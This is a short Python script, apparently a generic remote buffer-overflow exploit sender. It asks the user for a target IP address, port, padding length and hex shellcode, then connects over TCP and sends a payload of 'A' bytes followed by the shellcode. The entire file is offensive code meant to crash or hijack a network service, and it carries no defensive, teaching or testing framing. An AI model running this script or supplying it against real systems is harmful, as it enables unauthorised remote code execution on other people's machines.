import socket

tip = input("Enter the IP (Local or Public) (*): ")
tpo = int(input("Enter the port (*): "))
ovqus = int(input("Amount of the buffer overflow bytes (*): "))
shellcode_input = input("Enter your custom shellcode in hex format (e.g. \\x31\\xc0\\x50...): ")

shellcode = bytes(shellcode_input.encode().decode('unicode_escape'), 'latin-1')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((tip, tpo))

payload = b"A" * ovqus + shellcode
sock.send(payload)
sock.close()
